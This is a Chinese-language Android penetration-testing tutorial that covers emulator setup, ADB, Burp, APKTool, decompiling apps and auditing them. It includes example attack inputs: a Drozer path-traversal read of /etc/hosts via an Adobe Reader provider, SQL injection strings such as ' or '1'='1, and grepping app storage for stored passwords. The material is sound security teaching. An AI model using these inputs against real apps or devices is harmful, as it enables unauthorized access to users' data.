启动时，ADT 包将要求我们配置 Eclipse 的工作区。workspace（工作空间）是所有 Android 应用程序开发项目及其文件将被存储的位置。在这种情况下，我已将所有内容保留默认，并选中Use this as the default and do not ask me again（使用此为默认值，不再询问我）复选框： 一旦完全启动，我们可以继续创建 Android 虚拟设备。 Android 虚拟设备是配置用于特定版本的 Android 的模拟器配置。 模拟器是与 Android SDK 软件包一起提供的虚拟设备，通过它，开发人员可以运行正常设备的应用程序，并与他们在实际设备上进行交互。 这对于没有 Android 设备但仍然想创建 Android 应用程序的开发者也很有用。 [!NOTE] 这里要注意的一个有趣的特性是，在 Android 中，模拟器运行在 ARM 上，模拟的所有的事情与真实设备完全相同。 然而，在 iOS 中，我们的模拟器只是模拟环境，并不拥有所有相同组件和平台。 创建 Android 虚拟设备 为了创建Android虚拟设备，我们需要执行以下操作： 访问 Eclipse 的顶部栏，然后点击 Android 图标旁边的设备图标。 这将打开一个新的Android Virtual Device Manager（Android 虚拟设备管理器）窗口，其中包含所有虚拟设备的列表。 这是一个很好的选择，通过点击New（新建）按钮，创建一个新的虚拟设备。 我们还可以通过从终端运行 android 命令并访问工具，然后管理 AVD 来启动 Android 虚拟设备。 或者，我们可以简单指定 AVD 名称，并使用模拟器-avd [avd-name]命令来启动特定的虚拟设备。 这会打开一个新窗口，其中包含需要为 Android 虚拟设备配置的所有属性（尚未创建）。 我们将配置所有选项，如下面的截图所示： 一旦我们点击OK并返回到 AVD 管理器窗口，我们将看到我们新创建的 AVD。 现在，只需选择新的 AVD，然后单击Start...（开始）来启动我们创建的虚拟设备。 它可能需要很长时间，来为你的第一次使用加载，因为它正在配置所有的硬件和软件配置，来给我们真正的电话般的体验。 在以前的配置中，为了节省虚拟设备的启动时间，选中Snapshot复选框也是一个不错的选择。 一旦设备加载，我们现在可以访问我们的命令提示符，并使用 android 命令检查设备配置。 此二进制文件位于安装中的/sdk/tools文件夹下的adt-bundle文件夹中。 我们还要设置位于sdk文件夹中的tools和platform-tools文件夹的位置，就像我们之前使用环境变量一样。 为了获取我们系统中已连接（或加载）的设备的详细配置信息，可以运行以下命令： android list avd 我们在下面的屏幕截图中可以看到，上面的命令的输出显示了我们系统中所有现有 Android 虚拟设备的列表： 我们现在将继续，使用 或 Android Debug Bridge 开始使用设备，我们在上一章中已经看到。 我们还可以通过在终端中执行emulator -avd [avdname]命令来运行模拟器。 渗透测试实用工具 现在，让我们详细了解一些有用的 Android 渗透测试实用工具，如 Android Debug Bridge，Burp Suite 和 APKTool。 Android Debug Bridge Android Debug Bridge 是一个客户端 - 服务器程序，允许用户与模拟器器或连接的 Android 设备交互。 它包括客户端（在系统上运行），处理通信的服务器（也在系统上运行）以及作为后台进程在模拟器和设备上上运行的守护程序。 客户端用于 ADB 通信的默认端口始终是 5037，设备使用从 5555 到 5585 的端口。 让我们继续，通过运行adb devices命令开始与启动的模拟器交互。 它将显示模拟器已启动并运行以及连接到 ADB： adb devices List of devices attached emulator-5554 device 在某些情况下，即使模拟器正在运行或设备已连接，你也不会在输出中看到设备。 在这些情况下，我们需要重新启动 ADB 服务器，杀死服务器，然后再次启动它： adb kill-server adb start-server * daemon not running. starting it now on port 5037 * * daemon started successfully * 我们还可以使用pm（包管理器）工具获取所有已安装的软件包的列表，这可以在 ADB 中使用： adb shell pm list packages 如下面的屏幕截图所示，我们将获得设备上安装的所有软件包的列表，这在以后的阶段可能会有用： 此外，我们可以使用dumpsys meminfo然后是adb shell命令，获取所有应用程序及其当前内存占用的列表 我们还可以获取logcat（这是一个读取 Android 设备事件日志的工具），并将其保存到特定文件，而不是在终端上打印： adb logcat -d -f /data/local/logcats.log 此处的-d标志指定转储完整日志文件的并退出，-f标志指定写入文件而不是在终端上打印。 这里我们使用/data/local位置，而不是任何其他位置，因为这个位置在大多数设备中是可写的。 我们还可以使用df命令检查文件系统以及可用空间和大小： 在 Android SDK 中还有另一个很棒的工具，称为 MonkeyRunner。 此工具用于自动化和测试 Android 应用程序，甚至与应用程序交互。 例如，为了使用 10 个自动化触摸，敲击和事件来测试应用程序，我们可以在adb shell中使用monkey 10命令： monkey 10 monkey 10 Events injected: 10 ## Network stats: elapsed time=9043ms (0ms mobile, 0ms wifi, 9043ms not connected) 这些是一些有用的工具和命令，我们可以在 ADB 中使用它们。 我们现在将继续下载一些我们将来使用的其他工具。 Burp Suite 我们将在接下来的章节中使用的最重要的工具之一是 Burp 代理。 我们将使用它来拦截和分析网络流量。 应用程序中的许多安全漏洞可以通过拦截流量数据来评估和发现。 在以下步骤中执行此操作： 我们现在从官方网站http://portswigger.net/burp/download.html下载 burp 代理。 下载并安装后，你需要打开 Burp 窗口，它如以下屏幕截图所示。 你还可以使用以下命令安装 Burp： java –jar burp-suite.jar 我们在下面的截图中可以看到，我们运行了 Burp 并显示了默认界面： 在 Burp Suite 工具中，我们需要通过单击Proxy（代理）选项卡并访问Options（选项）选项卡来配置代理设置 在Options选项卡中，我们可以看到默认选项被选中，这是127.0.0.1:8080。 这意味着从我们的系统端口8080发送的所有流量将由 Burp Suite 拦截并且在它的窗口显示。 我们还需要通过选择默认代理127.0.0.1:8080并单击Edit（编辑）来检查隐藏的代理选项。 接下来，我们需要访问Request handling（请求处理）选项卡，并选中Support invisible proxying (enable only if needed)（支持不可见代理（仅在需要时启用））复选框： 最后，我们使用invisible选项运行代理： 一旦设置了代理，我们将启动我们的模拟器与我们刚刚设置的代理。 我们将使用以下模拟器命令来使用http-proxy选项： emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080 我们可以在下面的截图中看到命令如何使用： 因此，我们已经配置了 Burp 代理和模拟器，导致所有的模拟器流量现在会通过 Burp。 在这里，你在访问使用 SSL 的网站时可能会遇到问题，我们将在后面的章节中涉及这些问题。 APKTool Android 逆向工程中最重要的工具之一是 APKTool。 它为逆向第三方和封闭的二进制 Android 应用程序而设计。 这个工具将是我们在未来章节中的逆向主题和恶意软件分析的重点之一。 为了开始使用 APKTool，请执行以下步骤： 为了下载 APKTool，我们需要访问https://code.google.com/p/android-apktool/downloads/list。 在这里，我们需要下载两个文件：apktool1.5.3.tar.bz2，其中包含 apktool 主二进制文件，另一个文件取决于平台 - 无论是 Windows，Mac OS X 还是 Linux。 一旦下载和配置完成，出于便利，我们还需要将 APKTool 添加到我们的环境变量。 此外，最好将 APKTool 设置为环境变量，或者首先将其安装在/usr/bin中。 然后我们可以从我们的终端运行 APKTool，像下面的截图这样 总结 在本章中，我们使用 Android SDK，ADB，APKTool 和 Burp Suite 建立了 Android 渗透测试环境。 这些是 Android 渗透测试者应该熟悉的最重要的工具。 在下一章中，我们将学习如何逆向和审计 Android 应用程序。 我们还将使用一些工具，如 APKTool，dex2jar，jd-gui 和一些我们自己的命令行必杀技。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-10-25 20:49:37 "},"知识库/05.移动安全/00.Android/03.Android 应用的逆向和审计.html":{"url":"知识库/05.移动安全/00.Android/03.Android 应用的逆向和审计.html","title":"03.Android 应用的逆向和审计","keywords":"","body":"Android 应用程序拆解 Android 应用程序是在开发应用程序时创建的数据和资源文件的归档文件。 Android 应用程序的扩展名是.apk，意思是应用程序包，在大多数情况下包括以下文件和文件夹： Classes.dex (文件) AndroidManifest.xml (文件) META-INF (文件夹) resources.arsc (文件) res (文件夹) assets (文件夹) lib (文件夹) apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压 文件 注释 assets目录 存放APK的静态资源文件，比如视频，音频，图片等 lib 目录 armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件 META-INF目录 保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改) res目录 res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计 AndroidMainfest.xml文件 APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息 classes.dex文件 classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑 resources.arsc文件 resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源 为了验证这一点，我们可以使用任何归档管理器应用程序（如 7zip，WinRAR 或任何首选应用程序）简单地解压缩应用程序。 在 Linux 或 Mac 上，我们可以简单地使用unzip命令来展示压缩包的内容，如下面的截图所示： 这里，我们使用-l（list）标志，以便简单地展示压缩包的内容，而不是解压它。 我们还可以使用file命令来查看它是否是一个有效的压缩包。 Android 应用程序由各种组件组成，它们一起创建可工作的应用程序。 这些组件是活动，服务，广播接收器，内容供应器和共享首选项。 在继续之前，让我们快速浏览一下这些不同的组件： 活动（Activity）：这些是用户可以与之交互的可视界面。这些可以包括按钮，图像，TextView或任何其他可视组件 服务（Service）：这些 Android 组件在后台运行，并执行开发人员指定的特定任务。这些任务可以包括从 HTTP 下载文件到在后台播放音乐的任何内容。 广播接收器（Broadcast Receiver）：这些是 Android 应用程序中的接收器，通过 Android 系统或设备中存在的其他应用程序，监听传入的广播消息。一旦它们接收到广播消息，就可以根据预定义的条件触发特定动作。条件可以为收到 SMS，来电呼叫，电量改变等等。 共享首选项（Shared Preference）：应用程序使用这些首选项，以便为应用程序保存小型数据集。此数据存储在名为shared_prefs的文件夹中。这些小数据集可以包括名值对，例如游戏中的用户得分和登录凭证。不建议在共享首选项中存储敏感信息，因为它们可能易受数据窃取和泄漏的影响。 意图（Intent）：这些组件用于将两个或多个不同的 Android 组件绑定在一起。意图可以用于执行各种任务，例如启动动作，切换活动和启动服务。 内容供应器（Content Provider）：这些组件用于访问应用程序使用的结构化数据集。应用程序可以使用内容供应器访问和查询自己的数据或存储在手机中的数据。 现在我们知道了 Android 应用程序内部结构，以及应用程序的组成方式，我们可以继续逆向 Android 应用程序。 当我们只有.apk文件时，这是获得可读的源代码和其他数据源的方式。 AndroidManifest.xml AndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidManifest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。 属性 定义 versionCode 版本号，主要用来更新，例如:12 versionName 版本名，给用户看的，例如:1.2 package 包名，例如：com.zj.52pj.demo uses-permission android:name=\"\" 应用权限，例如：android.permission.INTERNET 代表网络权限 android:label=\"@string/app_name\" 应用名称 android:icon=\"@mipmap/ic_launcher\" 应用图标路径 android:debuggable=\"true\" 应用是否开启debug权限 逆向 Android 应用 正如我们前面讨论的，Android应用程序只是一个数据和资源的归档文件。 即使这样，我们不能简单地解压缩归档包（.apk）来获得可读的源代码。 对于这些情况，我们必须依赖于将字节代码（如在classes.dex中）转换为可读源代码的工具。 将字节码转换为可读文件的一种方法，是使用一个名为 dex2jar 的工具。 .dex文件是由 Java 字节码转换的 Dalvik 字节码，使其对移动平台优化和高效。 这个免费的工具只是将 Android 应用程序中存在的.dex文件转换为相应的.jar文件。 请遵循以下步骤： 从https://code.google.com/p/dex2jar/下载 dex2jar 工具。 现在我们可以使用它来运行我们的应用程序的.dex文件，并转换为.jar格式。 现在，我们需要做的是，转到命令提示符并访问 dex2jar 所在的文件夹。 接下来，我们需要运行d2j-dex2jar.bat文件（在 Windows 上）或d2j-dex2jar.sh文件（在 Linux / Mac 上），并提供应用程序名称和路径作为参数。 这里的参数中，我们可以简单地使用.apk文件，或者我们甚至可以解压缩.apk文件，然后传递classes.dex文件，如下面的截图所示： 正如我们在上面截图中看到的，dex2jar 已经成功地将应用程序的.dex文件转换为名为helloworld-dex2jar.jar的.jar文件。 现在，我们可以在任何 Java 图形查看器（如 JD-GUI)中打开此.jar文件，JD-GUI 可以从其官方网站http://jd.benow.ca/下载。 一旦我们下载并安装 JD-GUI，我们现在可以继续打开它。 它看起来像下面的截图所示： 在这里，我们现在可以打开之前步骤中转换的.jar文件，并查看 JD-GUI 中的所有 Java 源代码。 为了打开.jar文件，我们可以简单地访问File | Open。 在右侧窗格中，我们可以看到 Java 应用程序的 Java 源代码和所有方法。 请注意，重新编译过程会为你提供原始 Java 源代码的近似版本。 这在大多数情况下无关紧要; 但是，在某些情况下，你可能会看到转换的.jar文件中缺少某些代码。 此外，如果应用程序开发人员使用一些防止反编译的保护，如 proguard 和 dex2jar，当我们使用 dex2jar 或 Apktool 反编译应用程序时，我们不会看到准确的源代码; 相反，我们将看到一堆不同的源文件，这不是原始源代码的准确表示。 使用 Apktool 逆向 Android 应用 另一种逆向 Android应用程序的方法是将.dex文件转换为 smali 文件。 smali 是一种文件格式，其语法与称为 Jasmine 的语言类似。我们现在不会深入了解 smali 文件格式。有关更多信息，请参阅在线 wikihttps://code.google.com/p/smali/wiki/，以便深入了解 smali。 一旦我们下载 Apktool 并配置它，按照前面的章节的指示，我们都做好了进一步的准备。 与 JD-GUI 相比，Apktool 的主要优点是它是双向的。这意味着如果你反编译一个应用程序并修改它，然后使用 Apktool 重新编译它，它能跟完美重新编译，并生成一个新的.apk文件。然而，dex2jar 和 JD-GUI 不能做类似功能，因为它提供近似代码，而不是准确的代码。 因此，为了使用 Apktool 反编译应用程序，我们所需要做的是，将.apk文件与 Apktool 二进制文件一起传递给命令行。一旦反编译完成，Apktool 将使用应用程序名称创建一个新的文件夹，其中会存储所有的文件。为了反编译，我们只需调用apktool d [app-name].apk。这里，-d标志表示反编译。 在以下屏幕截图中，我们可以看到使用 Apktool 进行反编译的应用程序： 现在，如果我们进入 smali 文件夹，我们将看到一堆不同的 smali 文件，它们包含开发应用程序时编写的 Java 类的代码。在这里，我们还可以打开一个文件，更改一些值，并使用 Apktool 再次构建它。为了从 smali 构建一个改动的应用程序，我们将使用 Apktool 中的b（build）标志。 apktool b [decompiled folder name] [target-app-name].apk 但是，为了反编译，修改和重新编译应用程序，我个人建议使用另一个名为 Virtuous Ten Studio（VTS）的工具。这个工具提供与 Apktool 类似的功能，唯一的区别是 VTS 提供了一个漂亮的图形界面，使其相对容易使用。此工具的唯一限制是，它只在 Windows 环境中运行。我们可以从官方下载链接http://www.virtuous-ten-studio.com/下载 VTS。以下是反编译同一项目的应用程序的屏幕截图： 审计 Android 应用 Android 应用程序通常包含许多安全漏洞，大多数时候是由于开发人员的错误和安全编码实践的无视。 在本节中，我们将讨论基于 Android 应用程序的漏洞，以及如何识别和利用它们。 内容供应器泄露 许多应用程序使用内容供应器来存储和查询应用程序中的数据或来自电话的数据。 除非已经定义了内容提供者可以使用权限来访问，否则任何其他应用都可以使用应用所定义的内容供应器，来访问应用的数据。 所有内容供应器具有唯一的统一资源标识符（URI）以便被识别和查询。 内容提供者的 URI 的命名标准惯例是以content://开始。 如果 Android API 版本低于 17，则内容供应器的默认属性是始终导出。 这意味着除非开发人员指定权限，否则任何应用程序都可以使用应用程序的内容供应器，来访问和查询数据。 所有内容供应器都需要在AndroidManifest.xml中注册。 因此，我们可以对应用程序使用 Apktool，并通过查看AndroidManifest.xml文件检查内容供应器。 定义内容供应器的一般方法如下所示： 所以现在，我们将举一个漏洞应用程序的例子，并尝试利用内容供应器泄漏漏洞： 为了反编译应用程序，我们将使用 Apktool 来使用apktool d [appname].apk反编译应用程序。 为了找到内容供应器，我们可以简单地查看定义它们的AndroidManifest.xml文件，或者我们可以使用一个简单的grep命令，从应用程序代码中获取内容供应器，如下所示： 我们可以使用grep命令来查找内容提供者，使用grep –R 'content://'。 此命令将在每个子文件夹和文件中查找内容供应器，并将其返回给我们。 现在，我们在模拟器中安装应用程序。 为了查询内容供应器并确认漏洞是可利用的，我们需要在 Android 设备或模拟器中安装该应用程序。 使用以下代码，我们将在设备上安装易受攻击的app.apk文件： $ adb install vulnerable-app.apk 1869 KB/s (603050 bytes in 0.315s) pkg: /data/local/tmp/vulnerable-app.apk Success 我们可以通过创建另一个没有任何权限的应用程序来查询内容供应器，然后查询漏洞应用程序的内容供应器。 为了快速获得信息，我们还可以使用adb查询内容供应器，我们可以在以下命令中看到： adb shell content query - - uri [URI of the content provider] 以下是在漏洞应用程序上运行的命令，输出展示了存储在应用程序中的注释： 在这里，我们还可以使用 MWR 实验室的另一个名为 Drozer 的工具，以便在 Android 应用程序中找到泄漏的内容供应器漏洞。 我们可以从官方网站https://labs.mwrinfosecurity.com/tools/drozer/下载并安装 Drozer。 一旦我们安装了它，我们需要将代理组件agent.apk安装到我们的模拟器，它位于下载的.zip文件内。 该代理是系统和设备相互交互所需的。 我们还需要在每次启动模拟器时转发一个特定的端口（31415），以便建立连接。 要在 Mac 和其他类似平台上安装设备，我们可以按照https://www.mwrinfosecurity.com/system/assets/559/original/mwri_drozer-users-guide_2013-09-11.pdf上提供的在线指南。 一旦完成，我们可以启动应用程序，并单击\"Embedded Server（嵌入式服务器）\"文本。 从那里，我们需要回到设备，启动 Drozer 应用程序，并通过单击名为 Disabled 的左上角切换按钮启用服务器。 此后，我们需要访问终端并启动 Drozer，并将其连接到模拟器/设备。 为此，我们需要输入drozer console connect，如下面的截图所示： 在这里，我们可以运行app.provider.finduri模块来查找所有内容供应器，如下所示： dz> run app.provider.finduri com.threebanana.notes Scanning com.threebanana.notes… content://com.threebanana.notes.provider.NotePad/notes content://com.threebanana.notes.provider.NotePadPending/notes/ content://com.threebanana.notes.provider.NotePad/media content://com.threebanana.notes.provider.NotePad/topnotes/ content://com.threebanana.notes.provider.NotePad/media_with_owner/ content://com.threebanana.notes.provider.NotePad/add_media_for_note content://com.threebanana.notes.provider.NotePad/notes_show_deleted content://com.threebanana.notes.provider.NotePad/notes_with_images/ 一旦我们有了 URI，我们现在可以使用 Drozer 应用程序查询它。 为了查询它，我们需要运行app.provider.query模块并指定内容供应器的 URI，如下面的截图所示： 如果 Drozer 能够查询和显示来自内容供应器的数据，这意味着内容供应器泄漏数据并且存在漏洞，因为 Drozer 没有被明确地授予使用数据集的任何权限。 为了修复此漏洞，开发人员需要做的是，在创建内容供应器时指定参数android:exported = false，或者创建一些新的权限，另一个应用程序在访问供应器之前必须请求它。 不安全的文件存储 通常，开发人员为应用程序存储数据时，未指定文件的正确文件权限。 这些文件有时被标记为全局可读，并且可以由任何其它应用程序访问而不需要请求权限。 为了检查这个漏洞，我们所需要做的是访问adb shell，之后使用cd进入/data/data/[package name of the app]。 如果我们在这里执行一个简单的ls -l，就可以看到文件和文件夹的文件权限 ls -l /data/data/com.aditya.example/files/userinfo.xml -rw-rw-rw- app_200 app_200 22034 2013-11-07 00:01 userinfo.xml 这里我们可以使用find来搜索权限。 find /data/data/ -perm [permissions value] 如果我们执行cat userinfo.xml，它储存了应用的用户的用户名和密码。 grep 'password' /data/data/com.aditya.example/files/userinfo.xml mysecretpassword 这意味着任何其他应用程序也可以查看和窃取用户的机密登录凭据。 可以通过在开发应用程序时指定正确的文件权限，以及一起计算密码与盐的散列来避免此漏洞。 目录遍历或本地文件包含漏洞 顾名思义，应用程序中的路径遍历漏洞允许攻击者使用漏洞应用程序的供应器读取其他系统文件。 此漏洞也可以使用我们之前讨论的工具 Drozer 进行检查。 在这里，我们用例子来说明由 Seafastian Guerrero 发现的 Adobe Reader Android 应用程序漏洞（http://blog.seguesec.com/2012/09/path-traversal-vulnerability-on-adobe-reader-android-application）。 此漏洞存在于 Adobe Reader 10.3.1 中，并在以后的版本中进行了修补。 你可以从http://androiddrawer.com下载各种 Android 应用程序的旧版本。 我们将启动 Drozer，并运行app.provider.finduri模块来查找内容供应器 URI。 dz> run app.provider.finduri com.adobe.reader Scanning com.adobe.reader... content://com.adobe.reader.fileprovider/ content://com.adobe.reader.fileprovider 一旦我们找到了 URI，我们现在可以使用app.provider.read搜索并利用本地文件包含漏洞。 在这里，我尝试从系统中读取一些文件，如/etc/hosts和/proc/cpuinfo，它们默认存在于所有的 Android 实例中，因为它是基于 Linux 的文件系统。 dz> run app.provider.read content://com.adobe.reader.fileprovider/../../../../etc/hosts 127.0.0.1 localhost 正如我们在下面的屏幕截图中看到的，我们已经成功地使用 Adobe Reader 漏洞内容供应器读取了 Android 文件系统中的文件。 客户端注入攻击 客户端攻击通常发生在应用程序未检查用户输入的时候。 例如，在对 SQLite 数据库的查询期间，应用程序正在解析用户输入，因为它位于查询语句中。 让我们举一个应用程序的示例，它检查本地 SQLite 数据库，来根据登录凭据验证用户。 因此，当用户提供用户名和密码时，正在运行的查询将如下所示： SELECT * FROM 'users' where username='user-input-username' and password='user-input-password' 现在，在正常情况下，这将正常工作，用户输入其真正的登录凭据，并且查询取决于条件将返回true或false。 SELECT * FROM 'users' where username='aditya' and password='mysecretpass 但是，如果攻击者输入 SQL 语句而不是正常的用户名怎么办？ 请参考以下代码： SELECT * FROM 'users' where username='1' or '1' = '1' - - and password='mysecretpassword 因此，在这种情况下，即使用户不知道用户名和密码，他们可以通过使用1'or'1'='1查询来轻松绕过它，这在所有情况下都返回true。 因此，应用程序开发人员必须在应用程序中进行适当的检查，来检查用户输入。 我们还可以使用 Drozer 的app.provider.query来利用 SQL 注入漏洞。 其语法看起来像： run app.provider.query [Content Provider URI] --projection \"* FROM SQLITE_MASTER WHERE type='table';- -\" 现在，这将返回 SQLite 数据库中整个表的列表，它的信息存储在SQLITE_MASTER中。 您还可以继续并执行更多的 SQL 查询，来从应用程序提取更多的信息。 为了使用 Drozer 实战漏洞利用，你可以从https://www.mwrinfosecurity.com/products/drozer/community-edition/下载他们的漏洞应用程序。 OWASP 移动 Top10 Web 应用程序开放安全项目（OWASP）是涉及安全和漏洞搜索的标准之一。 它还发布了前 10 名漏洞的列表，其中包括在各种平台中最常见和重要的漏洞。 可以在https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks上找到 OWASP 移动版的前 10 个指南。 如果我们查看 OWASP 移动项目，以下是它涵盖的移动应用程序的 10 个安全问题： 服务端弱控制 不安全的数据存储 传输层保护不足 意外的数据泄漏 缺少授权和认证 无效的加密 客户端注入 通过不可信输入的安全决策 不正确的会话处理 缺乏二进制保护 让我们逐一介绍它们，并快速了解它们在移动应用程序中的关系，以及我们如何检测它们： 服务端弱控制 第一个 OWASP 漏洞是服务端弱控制，顾名思义，服务端不以安全的方式将数据从移动应用程序发送到服务端，或者在发送数据时暴露一些敏感的 API。 例如，考虑一个 Android 应用程序发送登录凭据到服务器进行身份验证，而不验证输入。 攻击者可以以这样的方式修改凭证，以便访问服务器的敏感或未授权区域。 此漏洞可视为移动应用程序和 Web 应用程序中的一个漏洞。 不安全的数据存储 这仅仅意味着，应用相关信息以用户可访问的方式在设备上存储。 许多 Android 应用程序在共享首选项，SQLite（纯文本格式）或外部存储器中，存储与用户相关的私密信息或应用程序信息。 开发人员应该始终记住，即使应用程序在数据文件夹（/data/data/package-name）中存储敏感信息，只要手机已 root，恶意应用程序/攻击者就可以访问它。 传输层保护不足 许多 Android 开发人员依赖于通过不安全模式的网络来发送数据，例如 HTTP 或没有正确实现 SSL 的形式。 这使得应用程序易受到网络上发生的所有不同类型的攻击，例如流量拦截，从应用程序向服务器发送数据时操纵参数，以及修改响应来访问应用程序的锁定区域。 意外的数据泄漏 当应用程序将数据存储在本身易受攻击的位置时，会出现此漏洞。 这些可能包括剪贴板，URL 缓存，浏览器 Cookie，HTML5DataStorage，统计数据等。 一个例子是用户登录到他们的银行应用程序，他们的密码已经复制到剪贴板。 现在，即使是恶意应用程序也可以访问用户剪贴板中的数据。 缺少授权和认证 如果 Android 应用程序或一般的移动应用程序在没有适当安全措施的情况下，尝试基于客户端检查来验证或授权用户，则这些应用程序最容易受到攻击。 应该注意的是，一旦手机已 root，大多数客户端保护可以被攻击者绕过。 因此，建议应用程序开发人员使用服务器端身份验证和授权进行适当的检查，一旦验证成功，请使用随机生成的令牌，以便在移动设备上验证用户。 无效的加密 这仅仅表示使用不安全的密码函数来加密数据部分。 这可能包括一些已知存在漏洞的算法，如 MD5，SHA1，RC2，甚至是没有适当的安全措施的定制算法。 客户端注入 这在Android应用程序中是可行的，主要成因是使用 SQLite 进行数据存储。 我们将在本书的各章中执行注入攻击。 通过不可信输入的安全决策 在移动应用程序中，开发人员应始终过滤和验证用户提供的输入或其他相关输入，并且不应该像在应用程序中那样使用它们。 不受信任的输入通常会导致应用程序中的其他安全风险，如客户端注入。 不正确的会话处理 在为移动应用程序执行会话处理时，开发人员需要处理很多因素，例如认证 cookie 的正常过期，安全令牌创建，cookie 生成和轮换，以及无法使后端的会话无效。 必须在 Web 应用程序和 Android 应用程序之间维护正确的安全同步。 缺乏二进制保护 这意味着不能正确地防止应用程序被逆向或反编译。 诸如 Apktool 和 dex2jar 之类的工具可用于逆向 Android 应用程序，如果没有遵循正确的开发实践，它会暴露应用程序的各种安全风险。 为了防止通过逆向攻击来分析应用程序，开发人员可以使用 ProGuard 和 DashO 等工具。 总结 在本章中，我们学习了使用各种方法来逆转 Android 应用程序并分析源代码。 我们还学习了如何修改源代码，然后重新编译应用程序，来绕过某些保护。 此外，我们还看到了如何使用 Drozer 等工具寻找 Android 应用程序中的漏洞。 你还可以通过http://labs.securitycompass.com/exploit-me/亲自尝试 Exploit-Me 实验室中的各种漏洞，它由 Security Compass 开发。 在下一章中，我们将进一步尝试 Android 应用程序的流量拦截，并在我们的渗透测试中使用它。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-08-19 14:02:18 "},"知识库/05.移动安全/00.Android/04.Android 设备进行流量分析.html":{"url":"知识库/05.移动安全/00.Android/04.Android 设备进行流量分析.html","title":"04.Android 设备进行流量分析","keywords":"","body":"在本章中，我们将研究 Android 设备的网络流量，并分析平台和应用程序的流量数据。 通常应用程序会在其网络数据中泄漏敏感信息，因此发现它是渗透测试程序最重要的任务之一。 此外，你经常会遇到通过不安全的网络协议执行身份验证和会话管理的应用程序。 因此，在本章中，我们将学习如何拦截和分析 Android 设备中，各种应用程序的流量。 Android 流量拦截 根据 OWASP 移动 Top10，不完善的传输层保护是第三大威胁。实际上，假设一个应用程序通过 HTTP 将用户的登录凭据提交到服务器。 如果用户位于咖啡店或机场，并在有人嗅探网络时登录到他的应用程序，会怎么样？ 攻击者能够获得特定用户的整个登录凭据，它以后可能用于恶意目的。 假设应用程序正在通过 HTTPS 进行身份验证，通过 HTTP 的会话管理，并且在请求中传递身份验证 Cookie。 在这种情况下，攻击者也能够通过在执行中间人攻击时拦截网络来获取身份验证 Cookie。 使用这些认证 cookie，他可以直接作为受害用户登录到应用程序。 流量分析方式 在任何情况下都有两种不同的流量捕获和分析方法。 我们将研究 Android 环境中可能的两种不同类型，以及如何在真实场景中执行它们。 被动和主动分析如下： 被动分析：这是一种流量分析的方法，其中应用程序发送的网络数据不会被拦截。 相反，我们将尝试捕获所有网络数据包，然后在网络分析器（如Wireshark）中打开它，然后尝试找出应用程序中的漏洞或安全问题。 主动分析：在主动分析中，渗透测试者将主动拦截所有正在进行的网络通信，并可以即时分析，评估和修改数据。 这里，他需要设置代理，并且由应用/设备生成和接收的所有网络流量会通过该代理。 被动分析 被动分析的概念是。将所有网络信息保存到特定文件中，之后使用数据包分析器查看。 这就是我们将在 Android 设备中进行被动分析。 我们将使用tcpdump来将所有的信息保存到设备中一个位置。 此后，我们将该文件拉取到我们的系统，然后使用 Wireshark 或 Cocoa 包分析器查看它。 请参阅以下步骤： 我们从 Timur Alperovich 的网站http://www.eecs.umich.edu/~timuralp/tcpdump-arm下载为 ARM 编译的tcpdump二进制文件。 如果我们需要，我们还可以下载tcpdump的原始二进制文件并交叉编译（为 Android 交叉编译你的二进制文件，请按照链接http://machi021.blogspot.jp/2011/03/compile-busybox-for-android.html。链接展示了交叉编译 BusyBox，但相同的步骤可以应用于tcpdump） 一旦我们下载了tcpdump，我们可以通过在我们刚刚下载的二进制上执行一个文件，来确认它是否为 ARM 编译。对于 Windows 用户，你可以使用 Cygwin 来执行命令。 输出类似于以下屏幕截图中所示： 这里的下一步是将tcpdump二进制文件推送到设备中的一个位置。 我们还必须记住，我们需要继续执行这个文件。 因此，我们将它推送到一个位置，我们可以从中更改权限，以及执行二进制来捕获流量。 现在，继续并使用adb的push命令推送二进制来将二进制推送到设备。 同样，在我们需要从设备中拉取内容的情况下，我们可以使用pull而不是push。 这里，我们将使用adb push将其推送到 Android 中的/data/local/tmp： adb push tcpdump-arm /data/local/tmp/tcpdump 一旦我们将tcpdump二进制推送到设备，然后需要使用adb在 shell 中访问设备，并更改二进制的权限。 如果我们试图运行tcpdump，它会给我们一个权限错误，因为我们没有执行权限。 为了更改权限，我们需要访问/data/local/tmp，使用chmod命令，并授予其权限777，这意味着应用程序将具有所有权限。 以下屏幕截图显示了上述命令的结果输出： 这里的最后一步是启动tcpdump并将输出写入.pcap文件。 使用-s，-v和-w标志启动tcpdump。 参考以下描述： -s：这表示从每个封包抽取给定（在我们的例子中为 0）字节的数据，而不是默认的 65535 字节。 -v：这表明详细输出。 -w：这表明写入原始数据包的文件名。 例如，我们可以使用./tcpdump -v -s 0 -w output.pcap，以便将所有文件写入output.pcap，并输出详细信息。 在流量捕获执行期间，打开手机浏览器并访问位于http://attify.com/data/login.html的漏洞登录表单，该表单通过 HTTP 发送所有数据并使用 GET 请求： 这里使用用户名android和密码mysecretpassword登录应用程序。 我们现在可以在任何时候通过adb shell服务终止进程（使用Ctrl + C）。 下一步是将捕获的信息从设备拉取到我们的系统。 为此，我们将简单地使用adb pull如下： adb pull /data/local/tmp/output.pcap output.pcap 你可能还需要更改output.pcap的权限才能拉取它。 在这种情况下，只需执行以下命令： chmod 666 output.pcap 一旦我们下载了捕获的网络数据的.pcap文件，我们可以在 Wireshark 中打开它并分析流量。 在这里，我们将尝试查找捕获的登录请求。 我们可以从网站http://www.wireshark.org/download.html下载 Wireshark。 一旦下载并安装完毕，打开 Wireshark 